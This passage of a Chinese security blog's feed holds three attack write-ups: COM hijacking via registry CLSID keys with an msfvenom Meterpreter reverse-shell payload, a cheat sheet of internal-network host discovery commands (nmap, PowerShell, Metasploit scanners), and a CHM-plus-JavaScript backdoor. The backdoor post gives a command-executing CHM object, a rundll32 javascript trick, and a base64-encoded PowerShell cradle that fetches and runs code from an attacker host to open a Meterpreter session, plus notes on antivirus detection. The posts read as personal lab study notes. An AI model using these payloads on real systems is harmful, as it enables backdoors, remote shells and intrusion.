class="string">'Attributes'</span>, <span class="number">0xf090013d</span>, <span class="string">'REG_DWORD'</span>, registry_view)</span><br><span class="line"></span><br><span class="line">    &#123;</span><br><span class="line">      <span class="symbol">name:</span>     target[<span class="symbol">:name</span>],</span><br><span class="line">      <span class="symbol">cmd_path:</span> target[<span class="symbol">:cmd_path</span>],</span><br><span class="line">      <span class="symbol">cmd_args:</span> target[<span class="symbol">:cmd_args</span>],</span><br><span class="line">      <span class="symbol">root_key:</span> root_key</span><br><span class="line">    &#125;</span><br><span class="line">  <span class="keyword">end</span></span><br></pre></td></tr></table></figure><p>向注册表添加</p><blockquote><p>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InProcServer32<br>HKCU\Software\Classes\CLSID{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ShellFolder</p></blockquote><p>InProcServer 中：</p><ul><li>Default -&gt; dll_path</li><li>ThreadingModel -&gt; Apartment</li><li>LoadWithoutCOM -&gt; Null</li></ul><p>ShellFolder 中：</p><ul><li>HideOnDesktop -&gt; Null</li><li>Attributes -&gt; 0xf090013d</li></ul><h2 id="0x03-复现"><a href="#0x03-复现" class="headerlink" title="0x03 复现"></a>0x03 复现</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/x64/meterpreter/reverse_tcp lhost=10.131.36.131 lport=4444 -f exe &gt; out.exe</span><br></pre></td></tr></table></figure><p><img src="/无标题.resources/0E2986DD-BCFB-443E-AFB1-884B8BBB60EF.png" alt="7b0554d147b29f2ea26ae50de761fd1a"><br>回弹拿到meterpreter session</p><p><img src="/无标题.resources/14E6038F-66BC-4AD3-9AC5-60A3B370D8A3.png" alt="2e3c6b217fb1c0f6eb5ee8e7e645c081"></p><p>无法getsystem</p><p><img src="/无标题.resources/F2BE433B-9D87-4A45-925C-701F6E351B27.png" alt="141b1b876500404f9687d93866b5a8e2"></p><p>可以看到，劫持了CLSID {0A29FF9E-7F9C-4437-8B11-F424491E3931}的会话，成功拿到反弹session</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;0x01-Com劫持原理&quot;&gt;&lt;a href=&quot;#0x01-Com劫持原理&quot; class=&quot;headerlink&quot; title=&quot;0x01 Com劫持原理&quot;&gt;&lt;/a&gt;0x01 Com劫持原理&lt;/h2&gt;&lt;p&gt;利用CLSID搜索顺序：&lt;/p&gt;
&lt;ol&gt;
&lt;li&gt;HKCU
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>内网主机发现</title>
    <link href="http://patrilic.top/2019/04/03/%E5%86%85%E7%BD%91%E4%B8%BB%E6%9C%BA%E5%8F%91%E7%8E%B0/"/>
    <id>http://patrilic.top/2019/04/03/内网主机发现/</id>
    <published>2019-04-03T03:59:32.000Z</published>
    <updated>2019-04-03T03:17:54.902Z</updated>
    
    <content type="html"><![CDATA[<p>[toc]</p><h2 id="0x01-发现内网存活主机"><a href="#0x01-发现内网存活主机" class="headerlink" title="0x01 发现内网存活主机"></a>0x01 发现内网存活主机</h2><h3 id="1-1-基于ARP发现内网主机"><a href="#1-1-基于ARP发现内网主机" class="headerlink" title="1.1 基于ARP发现内网主机"></a>1.1 基于ARP发现内网主机</h3><h4 id="nmap"><a href="#nmap" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PR 10.253.6.0/24</span><br></pre></td></tr></table></figure><h4 id="powershell"><a href="#powershell" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">C:\Users\Patrilic\Desktop&gt;powershell -exec bypass -Command &quot;Import-Module ./Invoke-ARPScan.ps1;Invoke-ARPScan -CIDR 192.168.121.1/24&quot;</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/F4D8B735-47A4-47AE-8C52-6EC48D0A494D.png" alt="b535427cfa8bff645f941c761de208ee"></p><p>Invoke-ARPScan 是Empire中的模块</p><h4 id="arp-scan-exe"><a href="#arp-scan-exe" class="headerlink" title="arp-scan.exe"></a>arp-scan.exe</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">arp</span>-<span class="title">scan.exe</span> -<span class="title">t</span> 192.168.121.0/24</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/B32AA3E3-6152-4659-A9B3-9D90AF18DB15.png" alt="1f8e2f46692be0db78c4aa872061312c"></p><h4 id="arp-ping-exe"><a href="#arp-ping-exe" class="headerlink" title="arp-ping.exe"></a>arp-ping.exe</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">arp</span>-<span class="title">ping.exe</span> 192.168.121.1</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/F9D157F9-667C-4A56-A2E1-84A0B9E89B14.png" alt="017bf04412ca847df46101caadf1c928"></p><h4 id="Empire"><a href="#Empire" class="headerlink" title="Empire"></a>Empire</h4><h4 id="netdiscover"><a href="#netdiscover" class="headerlink" title="netdiscover"></a>netdiscover</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">netdiscover -r 192.168.3.0/24 -i eth0</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/505FE0B8-6242-4894-ACEA-F131AFC3DFC9.png" alt="f40948147bbe5919da12d82a559b56d9"></p><h4 id="meterpreter"><a href="#meterpreter" class="headerlink" title="meterpreter"></a>meterpreter</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">meterpreter &gt; getsystem</span><br><span class="line">meterpreter &gt; run post/windows/gather/arp_scanner RHOSTS=10.253.6.1/24</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/012C3ADD-CD53-42DE-B40E-8459DB9382CC.png" alt="6189badfb2a72fed6459edba892064ba"></p><h4 id="Cain等"><a href="#Cain等" class="headerlink" title="Cain等"></a>Cain等</h4><h3 id="1-2-基于icmp发现主机"><a href="#1-2-基于icmp发现主机" class="headerlink" title="1.2 基于icmp发现主机"></a>1.2 基于icmp发现主机</h3><h4 id="cmd"><a href="#cmd" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">C:\<span class="title">Users</span>\<span class="title">Patrilic</span>\<span class="title">Desktop</span>&gt;<span class="title">for</span> /<span class="title">L</span> %<span class="title">I</span> <span class="title">in</span> (1,1,254) <span class="title">DO</span> @<span class="title">ping</span> -<span class="title">w</span> 1 -<span class="title">n</span> 1 192.168.121.%<span class="title">I</span> | <span class="title">findstr</span> "<span class="title">TTL</span>="</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/11FE87F8-DFC5-4F24-A6AE-59B567853401.png" alt="96cb8bb61bf9e88c2a3a7bda7547807d"></p><h4 id="nmap-1"><a href="#nmap-1" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sn -PE 192.168.3.0/24</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/193C3160-17B2-4BB2-A178-0115E0326584.jpg" alt="89c3bc440d2446f15121c4bcce576ca9"></p><h4 id="powershell-1"><a href="#powershell-1" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell.exe -exec bypass -Command <span class="string">"Import-Module C:\Invoke-TSPingSweep.ps1;Invoke-TSPingSweep -StartAddress 192.168.3.1 -EndAddress 192.168.3.254 -ResolveHost -ScanPort -Port 21,22,23,25,53,80,81,82,83,84,85,86,87,88,89,110,111,143,389,443,445,873,1025,1433,1521,2601,3306,3389,3690,5432,5900,7001,8000,8080,8081,8082,8083,8084,8085,8086,8087,8089,9090,10000"</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/F9F443E0-8516-4F3A-9036-369D557F9743.png" alt="cf17177493ff1f7678825dca8a46b76c"></p><h4 id="bash"><a href="#bash" class="headerlink" title="bash"></a>bash</h4><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> ip <span class="keyword">in</span> 10.131.36.&#123;1..254&#125; </span><br><span class="line"><span class="keyword">do</span> </span><br><span class="line">   ping <span class="variable">$ip</span> -c 1 &amp;&gt; /dev/null </span><br><span class="line">   <span class="keyword">if</span> [ $? -eq 0 ];<span class="keyword">then</span> </span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$ip</span> is alive .... </span><br><span class="line">   <span class="keyword">fi</span> </span><br><span class="line"><span class="keyword">done</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/AD2CCDBE-6B28-4064-8129-BD3DE928C01C.png" alt="573f9b41753a8eb36b56b062c2aa1fab"></p><h3 id="1-3-基于netbios协议发现主机"><a href="#1-3-基于netbios协议发现主机" class="headerlink" title="1.3 基于netbios协议发现主机"></a>1.3 基于netbios协议发现主机</h3><h4 id="cmd-1"><a href="#cmd-1" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtstat -n</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/9F50A42F-3516-4BA2-9C40-BA246B49B226.png" alt="ae9d6dd415b464302a342a0e9b30c5c4"></p><h4 id="nbtscan"><a href="#nbtscan" class="headerlink" title="nbtscan"></a>nbtscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nbtscan-1.0.35.exe -m 192.168.121.0/24</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/D0C9CDA1-7F52-4888-BAF3-A3CAC81214BC.png" alt="6a39cc10cd8c0f7b2a96d570c03d811a"></p><h4 id="nmap-2"><a href="#nmap-2" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script nbstat.nse -p137 192.168.1.0/24 -T4</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/31F8DB2A-6859-444C-B91B-E1FDA3090859.png" alt="b7d36bfa324e4c6fecc134c750ec6f82"></p><h3 id="1-4-基于smb协议发现主机"><a href="#1-4-基于smb协议发现主机" class="headerlink" title="1.4 基于smb协议发现主机"></a>1.4 基于smb协议发现主机</h3><h4 id="nmap-3"><a href="#nmap-3" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap ‐sU ‐sS ‐‐script smb‐enum‐shares.nse ‐p445 192.168.1.119/24</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/795DA407-659D-418D-A180-B10BB210C477.png" alt="856a0cc32348f1b49cb80a4a98303498"></p><h4 id="cmd-2"><a href="#cmd-2" class="headerlink" title="cmd"></a>cmd</h4><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">for</span> /l %a <span class="keyword">in</span>(<span class="number">1</span>,<span class="number">1</span>,<span class="number">254</span>) <span class="keyword">do</span> <span class="built_in">start</span> /min /low telnet <span class="number">192</span>.<span class="number">168</span>.<span class="number">1</span>.%a <span class="number">445</span></span><br></pre></td></tr></table></figure><h4 id="powershell-2"><a href="#powershell-2" class="headerlink" title="powershell"></a>powershell</h4><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="number">445</span>|%&#123;echo((new‐objectNet.Sockets.TcpClient).Connect(<span class="string">"10.253.6"</span>,<span class="variable">$_</span>)) <span class="string">"<span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span></span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">1</span>..<span class="number">5</span>|%&#123;<span class="variable">$a</span>=<span class="variable">$_</span>;<span class="number">445</span>|%&#123;echo((new‐object Net.Sockets.TcpClient).Connect(<span class="string">"192.168.1.<span class="variable">$a</span>"</span>,<span class="variable">$_</span>)) <span class="string">"Port <span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span>&#125;</span><br></pre></td></tr></table></figure><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">118</span>..<span class="number">119</span>|%&#123;<span class="variable">$a</span>=<span class="variable">$_</span>;write‐host<span class="string">"‐‐‐‐‐‐"</span>;write‐host <span class="string">"192.168.1.<span class="variable">$a</span>"</span>; <span class="number">80</span>,<span class="number">445</span> | % &#123;echo ((new‐object Net.Sockets.TcpClient).Con ect(<span class="string">"192.168.1.<span class="variable">$a</span>"</span>,<span class="variable">$_</span>)) <span class="string">"Port <span class="variable">$_</span> is open"</span>&#125; <span class="number">2</span>&gt;<span class="literal">$null</span>&#125;</span><br></pre></td></tr></table></figure><h3 id="1-5-基于snmp发现主机"><a href="#1-5-基于snmp发现主机" class="headerlink" title="1.5 基于snmp发现主机"></a>1.5 基于snmp发现主机</h3><h4 id="nmap-4"><a href="#nmap-4" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU --script snmp-brute 192.168.1.0/24 -T4</span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/62BB742B-9540-49B3-AEDB-1490A53D6143.png" alt="54f953ba0bf35bbe34623e0138e3f017"></p><h4 id="perl"><a href="#perl" class="headerlink" title="perl"></a>perl</h4><p><a href="https://github.com/dheiland-r7/snmp" target="_blank" rel="noopener">https://github.com/dheiland-r7/snmp</a><br><img src="/内网主机发现.resources/BE732D1F-6E9E-4B2A-8015-395F33CCE0A2.png" alt="7f535a08c8897275f57fb979975b1b8c"></p><h3 id="1-6-基于udp发现主机"><a href="#1-6-基于udp发现主机" class="headerlink" title="1.6 基于udp发现主机"></a>1.6 基于udp发现主机</h3><h4 id="nmap-5"><a href="#nmap-5" class="headerlink" title="nmap"></a>nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap -sU -T5 -sV --max-retries 1 192.168.1.100 -p 500</span><br></pre></td></tr></table></figure><h4 id="unicornscan"><a href="#unicornscan" class="headerlink" title="unicornscan"></a>unicornscan</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">unicornscan -mU 192.168.1.100</span><br></pre></td></tr></table></figure><h3 id="1-7-基于SqlDataSourceEnumerator"><a href="#1-7-基于SqlDataSourceEnumerator" class="headerlink" title="1.7 基于SqlDataSourceEnumerator"></a>1.7 基于SqlDataSourceEnumerator</h3><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">PowerShell -Command <span class="string">"[System.Data.Sql.SqlDataSourceEnumerator]::Instance.GetDataSources()"</span></span><br></pre></td></tr></table></figure><p><img src="/内网主机发现.resources/F69B4159-B3B4-4DDE-B4A3-BD483E8C1431.png" alt="db8c4d18ffad131d9641044e575fc820"></p><h3 id="1-8-基于msf发现主机"><a href="#1-8-基于msf发现主机" class="headerlink" title="1.8 基于msf发现主机"></a>1.8 基于msf发现主机</h3><h4 id="http服务"><a href="#http服务" class="headerlink" title="http服务"></a>http服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/http/http_version</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/http/title</span><br></pre></td></tr></table></figure><h4 id="smb服务"><a href="#smb服务" class="headerlink" title="smb服务"></a>smb服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smb/smb_version</span><br></pre></td></tr></table></figure><h4 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/ftp_version</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ftp/anonymous</span><br></pre></td></tr></table></figure><h4 id="arp服务"><a href="#arp服务" class="headerlink" title="arp服务"></a>arp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/arp_sweep</span><br></pre></td></tr></table></figure><h4 id="udp服务"><a href="#udp服务" class="headerlink" title="udp服务"></a>udp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/udp_sweep</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/discovery/udp_probe</span><br></pre></td></tr></table></figure><h4 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/ssh/ssh_version</span><br></pre></td></tr></table></figure><h4 id="telnet服务"><a href="#telnet服务" class="headerlink" title="telnet服务"></a>telnet服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/telnet/telnet_version</span><br></pre></td></tr></table></figure><h4 id="dns服务"><a href="#dns服务" class="headerlink" title="dns服务"></a>dns服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/dns/dns_amp</span><br></pre></td></tr></table></figure><h4 id="mysql服务"><a href="#mysql服务" class="headerlink" title="mysql服务"></a>mysql服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/mysql/mysql_version</span><br></pre></td></tr></table></figure><h4 id="netbios服务"><a href="#netbios服务" class="headerlink" title="netbios服务"></a>netbios服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/netbios/nbname</span><br></pre></td></tr></table></figure><h4 id="db2服务"><a href="#db2服务" class="headerlink" title="db2服务"></a>db2服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/db2/db2_version</span><br></pre></td></tr></table></figure><h4 id="端口发现"><a href="#端口发现" class="headerlink" title="端口发现"></a>端口发现</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ack</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/tcp</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/syn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/syn</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/ftpbounce</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/portscan/xmas</span><br></pre></td></tr></table></figure><h4 id="rdp服务"><a href="#rdp服务" class="headerlink" title="rdp服务"></a>rdp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/rdp/rdp_scanner</span><br></pre></td></tr></table></figure><h4 id="smtp服务"><a href="#smtp服务" class="headerlink" title="smtp服务"></a>smtp服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/smtp/smtp_version</span><br></pre></td></tr></table></figure><h4 id="pop3服务"><a href="#pop3服务" class="headerlink" title="pop3服务"></a>pop3服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/pop3/pop3_version</span><br></pre></td></tr></table></figure><h4 id="posgres服务"><a href="#posgres服务" class="headerlink" title="posgres服务"></a>posgres服务</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">auxiliary/scanner/postgres/postgres_version</span><br></pre></td></tr></table></figure><h4 id="调用nmap"><a href="#调用nmap" class="headerlink" title="调用nmap"></a>调用nmap</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">db_nmap</span><br></pre></td></tr></table></figure><h4 id="post组件"><a href="#post组件" class="headerlink" title="post组件"></a>post组件</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">windows/gather/arp_scanner </span><br><span class="line">windows/gather/enum_ad_computers </span><br><span class="line">windows/gather/enum_computers </span><br><span class="line">windows/gather/enum_domain </span><br><span class="line">windows/gather/enum_domains </span><br><span class="line">windows/gather/enum_ad_user_comments</span><br><span class="line">linux/gather/enum_network </span><br><span class="line">linux/busybox/enum_hosts </span><br><span class="line">windows/gather/enum_ad_users </span><br><span class="line">windows/gather/enum_domain_tokens </span><br><span class="line">windows/gather/enum_snmp</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;p&gt;[toc]&lt;/p&gt;
&lt;h2 id=&quot;0x01-发现内网存活主机&quot;&gt;&lt;a href=&quot;#0x01-发现内网存活主机&quot; class=&quot;headerlink&quot; title=&quot;0x01 发现内网存活主机&quot;&gt;&lt;/a&gt;0x01 发现内网存活主机&lt;/h2&gt;&lt;h3 id=&quot;1-1-基于AR
      
    
    </summary>
    
    
  </entry>
  
  <entry>
    <title>JS+CHM捆绑后门</title>
    <link href="http://patrilic.top/2019/04/03/JS%20+%20CHM%20%E6%8D%86%E7%BB%91%E5%90%8E%E9%97%A8/"/>
    <id>http://patrilic.top/2019/04/03/JS + CHM 捆绑后门/</id>
    <published>2019-04-03T03:58:32.000Z</published>
    <updated>2019-04-03T03:11:53.290Z</updated>
    
    <content type="html"><![CDATA[<p>学了一波evi1cg博客上的捆绑后门，做个记录</p><h2 id="0x01-思路"><a href="#0x01-思路" class="headerlink" title="0x01 思路"></a>0x01 思路</h2><blockquote><p>思路：<br>利用CHM后门调用rundll32.exe执行javascript获取恶意代码并执行</p></blockquote><blockquote><p>结果：<br>交互式shell or meterpreter（poershell）</p></blockquote><h2 id="0x02-chm后门"><a href="#0x02-chm后门" class="headerlink" title="0x02 chm后门"></a>0x02 chm后门</h2><p>calc.exe P0c<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">&lt;!DOCTYPE html&gt;&lt;html&gt;&lt;head&gt;&lt;title&gt;Mousejack replay&lt;/title&gt;&lt;head&gt;&lt;/head&gt;&lt;body&gt;</span><br><span class="line">command exec </span><br><span class="line">&lt;OBJECT id=x classid=&quot;clsid:adb880a6-d8ff-11cf-9377-00aa003b7a11&quot; width=1 height=1&gt;</span><br><span class="line">&lt;PARAM name=&quot;Command&quot; value=&quot;ShortCut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Button&quot; value=&quot;Bitmap::shortcut&quot;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item1&quot; value=&apos;,calc.exe&apos;&gt;</span><br><span class="line"> &lt;PARAM name=&quot;Item2&quot; value=&quot;273,1,1&quot;&gt;</span><br><span class="line">&lt;/OBJECT&gt;</span><br><span class="line">&lt;SCRIPT&gt;</span><br><span class="line">x.Click();</span><br><span class="line">&lt;/SCRIPT&gt;</span><br><span class="line">&lt;/body&gt;&lt;/html&gt;</span><br></pre></td></tr></table></figure></p><p>利用EasyCHM编译html文件</p><p>运行：<br><img src="/JS + CHM 捆绑后门.resources/EA116D89-8450-42AA-81EC-147BF4AEE0B4.png" alt="1917e96c5ce843b5730a1a09cab0bfa9"></p><h2 id="0x03-JS后门"><a href="#0x03-JS后门" class="headerlink" title="0x03 JS后门"></a>0x03 JS后门</h2><p>核心思路：rundll32.exe 执行 javascript 脚本 访问C&amp;C执行恶意代码</p><p>Poc：<br><figure class="highlight cmd"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">rundll32.exe javascript:"\..\mshtml,RunHTMLApplication ";alert</span><br><span class="line">('foo');</span><br></pre></td></tr></table></figure></p><p><img src="/JS + CHM 捆绑后门.resources/1B93425B-F900-4F41-9D44-137A3F162796.png" alt="f4f3d68173b359419c24507b1f942ec0"></p><h2 id="0x04-CHM-JS-捆绑"><a href="#0x04-CHM-JS-捆绑" class="headerlink" title="0x04 CHM + JS 捆绑"></a>0x04 CHM + JS 捆绑</h2><p>思路：<br>CHM后门 —-&gt; 调用rundll32.exe —–&gt; 调用javascript. —–&gt; 访问目标C2服务器 ——&gt;执行恶意代码  —–&gt; 交互式shell</p><p>优点：<br>防止传统CHM后门使用CMD /c 时引起的弹窗</p><p>缺点：</p><p>直接获取Meterpreter Session</p><p>使用Exploit ： exploit/multi/script/web_delivery<br><img src="/JS + CHM 捆绑后门.resources/F6F24805-822A-43A1-81E4-4EEA799D1EFC.png" alt="cacd683f6c64c4a3651f0572cdd12349"></p><p>存在特殊字符，在cmd下是不能直接运行的,使用Base64编码：<br><img src="/JS + CHM 捆绑后门.resources/8EA4EE4F-1C55-4FE0-9CEB-469FAE9AAAEB.png" alt="c54ede5591f858d718b4b01409b5aba3"></p><p>Powershell :<br><figure class="highlight powershell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">powershell -ep bypass -enc PQBuAGUAdwAtAG8AYgBqAGUAYwB0ACAAbgBlAHQALgB3AGUAYgBjAGwAaQBlAG4AdAA7AC4AcAByAG8AeAB5AD0AWwBOAGUAdAAuAFcAZQBiAFIAZQBxAHUAZQBzAHQAXQA6ADoARwBlAHQAUwB5AHMAdABlAG0AVwBlAGIAUAByAG8AeAB5ACgAKQA7AC4AUAByAG8AeAB5AC4AQwByAGUAZABlAG4AdABpAGEAbABzAD0AWwBOAGUAdAAuAEMAcgBlAGQAZQBuAHQAaQBhAGwAQwBhAGMAaABlAF0AOgA6AEQAZQBmAGEAdQBsAHQAQwByAGUAZABlAG4AdABpAGEAbABzADsASQBFAFgAIAAuAGQAbwB3AG4AbABvAGEAZABzAHQAcgBpAG4AZwAoACcAaAB0AHQAcAA6AC8ALwAxADkAMgAuADEANgA4AC4AMQAuADEAMAAzADoAOAAwADgAMQAvADEALwAnACkAOwAKAA==</span><br></pre></td></tr></table></figure></p><p>But:<br><img src="/JS + CHM 捆绑后门.resources/88D944CE-B983-4554-87AF-E38163827E99.png" alt="abcd0e35e422a4dc7c13de7884d4bb7f"></p><p>并不能bypass 360主防<br>允许程序执行后，可得到JSRAT Session 以及 meterpreter Session<br><img src="/JS + CHM 捆绑后门.resources/5E78F5F9-4F29-434E-B3CD-BA3DD373D1BE.png" alt="0081d77c6169108109e646204a07b69a"></p><p>主要还是检测了rundll32.exe 这个敏感进程</p><p><img src="/JS + CHM 